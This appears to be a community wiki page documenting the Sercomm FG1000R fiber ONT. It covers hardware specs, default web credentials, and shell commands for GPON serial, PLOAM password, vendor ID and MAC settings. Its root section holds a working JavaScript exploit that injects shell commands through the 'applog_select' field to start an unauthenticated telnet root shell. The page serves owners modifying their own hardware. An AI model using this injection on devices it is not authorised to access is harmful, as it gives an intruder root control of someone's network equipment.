---
title: Sercomm FG1000R
has_children: false
parent: Sercomm
---

# Hardware Specifications

|                 |                                |
| --------------- | ------------------------------ |
| Vendor/Brand    | Sercomm                        |
| Model           | FG1000R                        |
| ODM             | ✅                             |
| Chipset         | [Realtek RTL9602C](/chipset-realtek-rtl960x) |
| Flash           | 128MB SPI NAND (MXIC MX35LF1GE4AB) |
| RAM             | 64MB                           |
| CPU             | Lexra RLX5281 (MIPS)           |
| CPU Clock       | 625 MHz                        |
| Bootloader      | U-Boot RSDK 2011.12.NA-svn5    |
| Load addr       |                                |
| 2.5GBaseT       | ✅                             |
| PHY Ethernet    | Realtek RTL8221B               |
| Optics          | LC/APC                         |
| IP address      | 192.168.1.1/24                 |
| Web Gui         | ✅, User: `Tech` Password: `ftth@!` |
| SSH             |                                |
| Telnet          |                                |
| Serial          | ✅, only TX                    |
| Serial baud     | 115200                         |
| Serial encoding | 8-N-1                          |
| Form Factor     | ONT                            |

::: info Note
The FG1000R uses the same Realtek RTL9602C SoC as the [ODI DFP-34X-2C2](/ont-odi-realtek-dfp-34x-2c2) SFP sticks, but in a desktop ONT form factor with NAND flash (instead of NOR), 64 MB RAM (instead of 32 MB), and a 2.5GBaseT Ethernet port via an external RTL8221B PHY (instead of the direct SFP SerDes). The Sercomm application framework runs on top of the Realtek Luna SDK.
:::

<ImageFigure file="fg1000r_front.jpg" alt="Sercomm FG1000R front" caption="Sercomm FG1000R front" />
<ImageFigure file="fg1000r_rear.jpg" alt="Sercomm FG1000R rear" caption="Sercomm FG1000R rear" />
<ImageFigure file="fg1000r_device.jpg" alt="Sercomm FG1000R device" caption="Sercomm FG1000R device" />
<ImageFigure file="fg1000r_pon.jpg" alt="Sercomm FG1000R PON" caption="Sercomm FG1000R PON" />
<ImageFigure file="fg1000r_inside.jpg" alt="Sercomm FG1000R inside" caption="Sercomm FG1000R inside" />

## Serial

The serial console is active at 115200 8-N-1 but only TX is exposed (no way to send input). See the inside photo for pin identification.

## Root procedure

::: warning
The root procedure has not been fully tested. The FG1000R uses the same Sercomm framework as the [FG1000B](/ont-sercomm-fg1000b), so the same web injection technique may work. See [FG1000B: Enabling telnet/SSH/serial](/ont-sercomm-fg1000b#enabling-telnet-ssh-serial) for the general approach.
:::

The FG1000R has a web GUI accessible at `http://192.168.1.1` with credentials `Tech` / `ftth@!`. The same `applog_select` command injection used on the FG1000B may apply here, adapted for the FG1000R's IP address:

```javascript
// Fetch a non csrf protected page to get a csrf token
await fetch("http://192.168.1.1/setup.cgi?next_file=statusandsupport/status.html").then(function (response) {
	return response.text();
}).then(function (html) {
    var el = document.createElement( 'html' );
    el.innerHTML = html;
    var es = el.getElementsByTagName( 'script' );
	var aText = es[0].text;
    document.csrf_token = aText.match("'(.*)'")[1];
}).catch(function (err) {
	console.warn('Something went wrong.', err);
});

// use the csrf token to activate telnet
fetch('http://192.168.1.1/data/statussupporteventlog_applog_download.json?_=1686211215966&csrf_token='+document.csrf_token, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
  },
  body: 'applog_select=a;echo "#!/bin/sh" > /tmp/slogin;echo "export PATH=/bin:/sbin:/usr/bin:/usr/sbin" >> /tmp/slogin;echo "/bin/sh" >> /tmp/slogin;/bin/chmod 755 /tmp/slogin;/usr/sbin/telnetd -l /tmp/slogin'
})
.then(res => res.json())
.then(console.log)
```

## List of software versions

::: info
No firmware versions have been documented yet. If you have access to the device, the firmware version can be found in the web interface or via the shell.
:::

## List of partitions

::: warning
The partition layout has not been documented yet. If you have shell access, please run `cat /proc/mtd` and share the output.
:::

Since the FG1000R uses 128 MB SPI NAND flash (unlike the 8 MB SPI NOR of the SFP sticks), the partition layout will be significantly different from the [ODI DFP-34X-2C2](/ont-odi-realtek-dfp-34x-2c2#list-of-partitions). It likely uses UBI/UBIFS or a similar NAND-aware filesystem.

# Useful files and binaries

::: warning
The following information is based on the typical Sercomm/Luna SDK platform. Verify on your device.
:::

## Useful files
- `/var/config/lastgood.xml` - Contains the user portion of the configuration
- `/tmp/omcilog` - OMCI messages logs (must be enabled)

## Useful binaries
- `flash` - Used to manipulate the config files
- `nv` - Used to manipulate nvram storage, including persistent config entries via `nv setenv`/`nv getenv`
- `omcicli` - Used to interact with the running OMCI daemon
- `omci_app` - The OMCI daemon
- `diag` - Used to run low-level diagnostics commands
- `cmld_client` - Sercomm configuration daemon client (if the Sercomm framework layer is present)

# GPON ONU status

## Getting the operational status of the ONU

Using Luna SDK diag:
```sh
diag gpon get onu-state
```

## Querying a particular OMCI ME
```sh
omcicli mib get MIB_IDX
```

The list of the MEs is in [GPON MIB](/mib).

## Getting the GEM ports and the flows
```sh
diag gpon show us-flow
diag gpon show ds-flow
```

## Getting the port status
```sh
diag port get status port all
```

# GPON/OMCI settings

::: warning
The commands below assume the standard Luna SDK `flash` command is available. If the FG1000R uses the Sercomm `cmld_client` framework instead, refer to the [FG1000B commands](/ont-sercomm-fg1000b#gpon-omci-settings) and adapt accordingly.
:::

## Getting/Setting ONU GPON Serial Number
```sh
flash get GPON_SN
flash set GPON_SN SCOM12345678
```

## Getting/Setting ONU GPON PLOAM password

```sh
flash get GPON_PLOAM_PASSWD
flash set GPON_PLOAM_PASSWD 41414141414141414141
```

## Getting/Setting OMCI software version (ME 7)
```sh
flash get OMCI_SW_VER1
flash set OMCI_SW_VER1 YOURFIRSTSWVER
flash get OMCI_SW_VER2
flash set OMCI_SW_VER2 YOURSECONDSWVER
```

## Getting/Setting OMCI hardware version (ME 256)
```sh
flash get HW_HWVER
flash set HW_HWVER MYHWVERSION
```

## Getting/Setting OMCI vendor ID (ME 256)
Default value: `SCOM` (Sercomm)
```sh
flash get PON_VENDOR_ID
flash set PON_VENDOR_ID HWTC
```

## Getting/Setting OMCI equipment ID (ME 257)
```sh
flash get GPON_ONU_MODEL
flash set GPON_ONU_MODEL FG1000R
```

# Advanced settings

## Setting management IP
```sh
flash get LAN_IP_ADDR
flash set LAN_IP_ADDR 192.168.1.1
```

## Checking the currently active image
```sh
nv getenv sw_active
nv getenv sw_version0
nv getenv sw_version1
```

## Booting to a different image
```sh
nv setenv sw_commit 0
nv setenv sw_active 0
reboot
```

## Setting management MAC
::: danger Warning
Back up the original MAC address before changing it.
:::

```sh
flash get ELAN_MAC_ADDR
flash set ELAN_MAC_ADDR A095XXXXXXXX
```

## Getting/Setting Speed LAN Mode

::: info Note
The FG1000R has a 2.5GBaseT Ethernet port via an external RTL8221B PHY. The `LAN_SDS_MODE` setting controls the SerDes link between the RTL9602C SoC and the RTL8221B PHY, not the copper Ethernet speed (which is auto-negotiated by the PHY).
:::

```sh
flash get LAN_SDS_MODE
flash set LAN_SDS_MODE VALUE
```

## Rebooting the ONT
```sh
reboot
```

# Comparison with related devices

| Feature | FG1000R | [FG1000B](/ont-sercomm-fg1000b) | [ODI DFP-34X-2C2](/ont-odi-realtek-dfp-34x-2c2) |
| ------- | ------- | ------- | ------- |
| Chipset | Realtek RTL9602C | Broadcom BCM68360_B1 | Realtek RTL9601D (RTL9602C die) |
| Flash | 128 MB SPI NAND | 128 MB NAND | 8 MB SPI NOR |
| RAM | 64 MB | 256 MB | 32 MB |
| Ethernet | 2.5GBaseT (RTL8221B PHY) | 2.5GBaseT (RTL8221B PHY) | SFP SerDes (direct) |
| Form factor | ONT | ONT | SFP stick |
| Vendor framework | Sercomm + Luna SDK | Sercomm + Broadcom SDK | Luna SDK only |

# Open firmware (odi-oss)

::: info Note
The [odi-oss](https://github.com/AndreZiviani/odi-oss) open firmware targets the ODI DFP-34X-2C2 SFP stick which shares the same RTL9602C SoC. However, porting it to the FG1000R would require significant work due to the different flash type (NAND vs NOR), host port (RTL8221B PHY vs direct SerDes), board init sequence, GPIO map, and memory configuration. The GPON MAC driver, switch core, and OMCI daemon could potentially be reused. See the [odi-oss CONTRIBUTING.md](https://github.com/AndreZiviani/odi-oss/blob/main/CONTRIBUTING.md) for the project scope.
:::

# Miscellaneous Links

- [Realtek RTL960x chipset page](/chipset-realtek-rtl960x)
- [Hacking RTL960x](https://github.com/Anime4000/RTL960x)
- [Sercomm FG1000B](/ont-sercomm-fg1000b) - sister model with Broadcom chipset
